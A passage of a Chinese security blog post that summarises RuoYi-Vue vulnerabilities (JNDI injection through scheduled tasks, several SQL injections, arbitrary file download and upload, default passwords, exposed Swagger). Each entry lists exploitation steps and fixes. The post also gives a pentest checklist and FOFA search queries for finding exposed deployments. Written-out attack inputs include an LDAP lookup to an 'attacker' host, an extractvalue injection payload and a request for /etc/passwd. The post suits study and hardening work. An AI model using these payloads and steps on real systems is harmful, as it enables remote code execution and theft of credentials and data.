+<p>升级至 &gt;= 4.7.2；去掉类路径执行任务逻辑；仅保留预定义 Bean 调用；加强定时任务合法性校验。</p>
+<h3 id="8-定时任务-jndi-注入-rce--共通漏洞-">8. 定时任务 JNDI 注入 RCE [ 共通漏洞 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>无</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.6.2（JDK &lt; 8u191）</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>JNDI注入/RCE</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>通过修改定时任务目标触发 JNDI lookup，指向攻击者控制的 LDAP/RMI 服务器加载远程恶意类。前后分离版同样存在此漏洞，但利用前提需获取管理员 JWT Token。在 JDK &gt;= 8u191 后默认禁止远程 codebase 信任，增加利用难度。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>获取管理员权限</p>
+</li>
+<li>
+<p>使用 marshalsec 启动 LDAP 引用服务</p>
+</li>
+<li>
+<p>新建定时任务 invokeTarget: javax.naming.InitialContext.lookup(&rsquo;ldap://attacker:1389/evil')</p>
+</li>
+<li>
+<p>执行任务触发 RCE</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>禁用类路径调用方式；升级 JDK 至 &gt;= 8u191；定时任务白名单校验；限制服务器外网访问。</p>
+<h3 id="9-gentable-sql-注入--定时任务-rce组合利用--共通漏洞-">9. GenTable SQL 注入 + 定时任务 RCE（组合利用） [ 共通漏洞 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>无公开 CVE</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>4.7.3 ~ 4.7.8</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>SQL注入+RCE</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>genTableServiceImpl.createTable() 方法在 MyBatis Mapper XML 中使用 ${sql} 直接拼接。攻击者通过定时任务调用该 Bean 执行 UPDATE SQL，将恶意 payload 以十六进制编码写入 sys_job 表的 invoke_target 字段，绕过黑白名单限制。被修改的任务执行时即触发 RCE。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>创建定时任务调用 genTableServiceImpl.createTable(&lsquo;UPDATE sys_job SET invoke_target=0x[hex_payload] WHERE job_id=100;&rsquo;)</p>
+</li>
+<li>
+<p>恶意载荷用十六进制编码绕过字符过滤</p>
+</li>
+<li>
+<p>执行该任务完成数据库修改</p>
+</li>
+<li>
+<p>再执行 job_id=100 的任务触发 JNDI/SnakeYAML RCE</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>升级至最新版本；genTableServiceImpl.createTable 严格白名单（仅 CREATE TABLE）；MyBatis 使用 #{} 代替 ${}；定时任务执行前再次校验 invoke_target。</p>
+<h2 id="3-sql-注入漏洞">3. SQL 注入漏洞</h2>
+<h3 id="10-认证用户-createtable-接口-sql-注入--共通漏洞-">10. 认证用户 createTable 接口 SQL 注入 [ 共通漏洞 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>CVE-2024-57521</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.7.9</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>SQL注入</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>漏洞位于代码生成功能 /tool/gen/createTable 接口，接收用户传入的 sql 参数通过 SqlUtil.filterKeyword(sql) 过滤。但正则表达式存在缺陷，攻击者可绕过过滤执行任意 SQL，通过布尔盲注读取数据库敏感信息。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>已登录用户向 /tool/gen/createTable 提交构造的 sql 参数</p>
+</li>
+<li>
+<p>借助 CREATE TABLE &hellip; AS SELECT &hellip; 语法</p>
+</li>
+<li>
+<p>结合 IF(&hellip;, 1, 1/0) 条件报错逻辑逐字符枚举数据</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>升级至最新版本；加强 SQL 过滤正则；用白名单替代黑名单；对代码生成模块实施更严格权限控制。</p>
+<h3 id="11-后台-datascope-参数-sql-注入--共通漏洞-">11. 后台 dataScope 参数 SQL 注入 [ 共通漏洞 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>CNVD-2021-21523</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.6.1</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>SQL注入</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>数据权限实现使用 MyBatis 动态 SQL ${params.dataScope}（非预编译），注入点包括 /system/role/list、/system/dept/list 等接口。攻击者通过构造 params[dataScope] 参数注入恶意 SQL 语句。SysDept 的 ${ancestors} 也存在类似问题。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>登录后台</p>
+</li>
+<li>
+<p>向 /system/role/list 发送请求</p>
+</li>
+<li>
+<p>添加参数 params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))</p>
+</li>
+<li>
+<p>通过报错注入获取数据库信息</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>升级至 &gt;= 4.6.2；MyBatis 中 ${} 改为 #{}；执行前调用 clearDataScope 清空字段；对输入严格过滤。</p>
+<h3 id="12-orderbycolumn-排序参数-sql-注入--共通漏洞-">12. orderByColumn 排序参数 SQL 注入 [ 共通漏洞 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>无统一 CVE</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>多版本（含较新版本）</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>SQL注入</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>分页查询的排序参数 orderByColumn 使用 ${} 动态拼接 SQL。攻击者可在排序字段中注入 SQL 表达式，通过时间盲注、CASE WHEN 等方式获取数据库信息。即使在较新版本中也可通过嵌套 CASE WHEN 绕过正则白名单。</p>
+<p>利用方式</p>
+<p>修改请求中 orderByColumn 参数为恶意 SQL 表达式（如三级嵌套 CASE WHEN 绕过正则检测）</p>
+<p>修复建议</p>
+<p>对排序字段做严格白名单校验（仅允许数据库字段名）；使用 #{} 参数化。</p>
+<h2 id="4-文件操作与其他漏洞">4. 文件操作与其他漏洞</h2>
+<h3 id="13-任意文件下载定时任务修改路径--共通漏洞-">13. 任意文件下载（定时任务修改路径） [ 共通漏洞 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>CVE-2023-27025 / CNVD-2021-01931</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.7.6</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>任意文件下载</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>定时任务允许调用 ruoYiConfig.setProfile() 修改文件存储根目录。攻击者将路径修改为系统根目录后，通过 /common/download/resource 接口可下载服务器任意文件（包括 application.yml 获取数据库密码和 JWT 密钥）。低版本还存在直接 ../ 路径穿越。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>新建定时任务，调用 ruoYiConfig.setProfile(&rsquo;/&rsquo;) 或 ruoYiConfig.setProfile(&lsquo;C:&rsquo;)</p>
+</li>
+<li>
+<p>执行任务修改文件基准路径</p>
+</li>
+<li>
+<p>访问 /common/download/resource?resource=/etc/passwd</p>
+</li>
+<li>
+<p>下载 application.yml 获取 JWT 密钥</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>升级至 &gt;= 4.7.7；禁止定时任务调用配置修改方法；文件下载接口严格路径白名单；禁止 ../ 穿越。</p>
+<h3 id="14-任意文件上传存储型-xss--rce--共通漏洞-">14. 任意文件上传（存储型 XSS / RCE） [ 共通漏洞 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>CVE-2022-32065</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.7.3</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>文件上传</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>后台文件上传功能对文件类型校验不严，攻击者可上传含恶意代码的 HTML 文件实现存储型 XSS，在特定配置下（如 Tomcat 允许解析 JSP）可能上传 WebShell 实现 RCE。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>登录后台</p>
+</li>
+<li>
+<p>通过文件上传接口上传恶意 HTML 或 JSP 文件</p>
+</li>
+<li>
+<p>访问上传后的文件路径触发 XSS 或命令执行</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>严格限制上传文件类型白名单；上传文件重命名；存储在非 Web 可访问目录；添加文件内容检测。</p>
+<h3 id="15-默认弱口令-adminadmin123--共通漏洞-">15. 默认弱口令 admin/admin123 [ 共通漏洞 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>无</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>所有版本</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>默认凭据</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>系统默认管理员账户 admin/admin123，另有测试账号 ry/123456。大量部署实例未修改默认密码，攻击者无需破解即可获得后台管理权限，进而利用定时任务等功能深入攻击。</p>
+<p>利用方式</p>
+<p>直接使用 admin/admin123 或 ry/123456 登录管理后台</p>
+<p>修复建议</p>
+<p>部署后强制修改所有默认密码；实现密码复杂度策略（&gt;=12位）；启用登录失败锁定；集成 OAuth2 或 MFA。</p>
+<h3 id="16-swagger-api-文档未授权访问--共通漏洞-">16. Swagger API 文档未授权访问 [ 共通漏洞 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>无</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>生产环境未关闭 Swagger 的版本</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>信息泄露</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>中危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>RuoYi-Vue 集成 Swagger 用于接口文档管理，若生产环境未关闭，攻击者可通过 /swagger-ui.html 或 /swagger-resources 获取全部后端 API 接口定义，大幅降低攻击成本。</p>
+<p>利用方式</p>
+<p>访问 /prod-api/swagger-ui.html 或 /swagger-resources 获取全部 API 接口信息</p>
+<p>修复建议</p>
+<p>生产环境禁用 Swagger（配置 springfox.documentation.enabled=false）；或将 Swagger 路径纳入认证。</p>
+<h2 id="渗透测试重点路径">渗透测试重点路径</h2>
+<p>前台（无需认证）阶段：</p>
+<ul>
+<li>
+<p>尝试默认口令 admin/admin123、ry/123456</p>
+</li>
+<li>
+<p>探测 Druid 监控台 /prod-api/druid/login.html（弱口令 ruoyi/123456）</p>
+</li>
+<li>
+<p>探测 Actuator 端点 /actuator、/actuator/heapdump</p>
+</li>
+<li>
+<p>探测 Swagger /swagger-ui.html、/swagger-resources</p>
+</li>
+<li>
+<p>检查 JWT 密钥是否为默认值（尝试伪造 Token）</p>
+</li>
+<li>
+<p>前端 Vue 源码中查找 API 地址和配置信息</p>
+</li>
+</ul>
+<p>后台（已获取权限）阶段：</p>
+<ul>
+<li>
+<p>定时任务模块 — 最主要 RCE 攻击面（SnakeYAML/JNDI/GenTable 组合链）</p>
+</li>
+<li>
+<p>代码生成模块 — createTable SQL 注入（CVE-2024-57521）</p>
+</li>
+<li>
+<p>通过定时任务修改 ruoYiConfig.setProfile() 实现任意文件下载</p>
+</li>
+<li>
+<p>各管理接口 SQL 注入点（orderByColumn、params[dataScope]）</p>
+</li>
+<li>
+<p>文件上传接口 — 尝试上传 HTML/JSP 等恶意文件</p>
+</li>
+</ul>
+<p>资产识别特征：</p>
+<ul>
+<li>
+<p>FOFA: body=&ldquo;若依&rdquo; || body=&ldquo;RuoYi&rdquo; || body=&ldquo;ruoyi-vue&rdquo; || icon_hash=&ldquo;706913071&rdquo;</p>
+</li>
+<li>
+<p>鹰图: web.body=&ldquo;若依&rdquo; || web.title=&ldquo;若依管理系统&rdquo;</p>
+</li>
+<li>
+<p>特征: 前端通过 /dev-api 或 /prod-api 代理后端；登录页 Vue 应用；API 接口返回 JSON 格式</p>
+</li>
+<li>
+<p>区分单体版与前后分离版: 无 rememberMe Cookie = 前后分离版（Spring Security + JWT）</p>
+</li>
+</ul>
+<h2 id="通用安全加固建议">通用安全加固建议</h2>
+<table>
+  <thead>
+      <tr>
+          <th>#</th>
+          <th>措施</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>及时升级版本</td>
+          <td>始终使用 RuoYi-Vue 最新稳定版本，关注官方 Gitee 仓库的安全更新公告。</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>JWT 密钥加固</td>
+          <td>使用 &gt;= 32 位强随机密钥；配置为环境变量而非明文；定期轮换；考虑 RSA 非对称签名。</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>Token 生命周期管理</td>
+          <td>有效期压缩至 30 分钟；实现基于 Redis 的 Token 黑名单；支持强制注销。</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>Spring Security 收紧</td>
+          <td>最小化 permitAll() 配置；Swagger/Druid/Actuator 全部纳入认证保护。</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>定时任务安全加固</td>
+          <td>仅允许调用预定义安全 Bean 方法；移除类全路径实例化逻辑；生产环境考虑移除 ruoyi-quartz。</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>SQL 注入防护</td>
+          <td>全面排查 ${} 替换为 #{}；排序字段严格白名单；移除或限制代码生成模块 SQL 执行功能。</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>CORS 严格配置</td>
+          <td>allowedOrigins 配置为具体可信域名；禁止通配符 *；限制 allowedMethods。</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>生产环境加固</td>
+          <td>关闭 Swagger/Druid/Actuator；删除 ruoyi-generator 模块；修改所有默认密码。</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="参考来源">参考来源</h2>
+<ul>
+<li>
+<p>博客园 - 若依(RuoYi)框架漏洞总结 (backlion)</p>
+</li>
+<li>
+<p>高木のBlog - RuoYi-Vue历史漏洞</p>
+</li>
+<li>
+<p>高木のBlog - RuoYi全系列漏洞详解</p>
+</li>
+<li>
+<p>奇安信攻防社区 - 若依(RuoYi)框架漏洞战争手册</p>
+</li>
+<li>
+<p>Baidu Comate - RuoYi-Vue框架常见漏洞及修复方案全解析</p>
+</li>
+<li>
+<p>腾讯云 - CVE-2024-57521 RuoYi v4.7.9 SQL注入漏洞</p>
+</li>
+<li>
+<p>CNVD-2021-21523 - 若依管理系统SQL注入漏洞</p>
+</li>
+<li>
+<p>CNVD-2020-69484 - 若依后台管理系统未授权访问漏洞</p>
+</li>
+<li>
+<p>CVE-2023-27025 - 若依任意文件下载漏洞</p>
+</li>
+<li>
+<p>CVE-2022-32065 - 若依文件上传漏洞</p>
+</li>
+<li>
+<p>Gitee - RuoYi-Vue 官方 Issues</p>
+</li>
+<li>
+<p>狼目安全 - 若依前后端分离下的渗透测试</p>
+</li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2026-01-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ruoyi/">Ruoyi</a>,&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/%E4%BB%80%E4%B9%88%E6%98%AF%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1/" class="prev" rel="prev" title="什么是代理对象？"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>什么是代理对象？</a>
+            <a href="/posts/spring-bean%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/" class="next" rel="next" title="Spring Bean的生命周期">Spring Bean的生命周期<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.154.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"rTeTnudkYwu3cz5ejsdiKdFm-gzGzoHsz","appKey":"SfE7A8tmPKu2F6Pf5LMUewa4","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@15.1.2/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-CN","meta":["nick","mail"],"pageSize":10,"placeholder":"在这里留下足迹吧!","recordIP":true,"visitor":true}},"search":{"algoliaAppID":"CT9HNMDY0J","algoliaIndex":"hugo","algoliaSearchKey":"e48b980a6aaab08129f8a8d9a425c47b","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
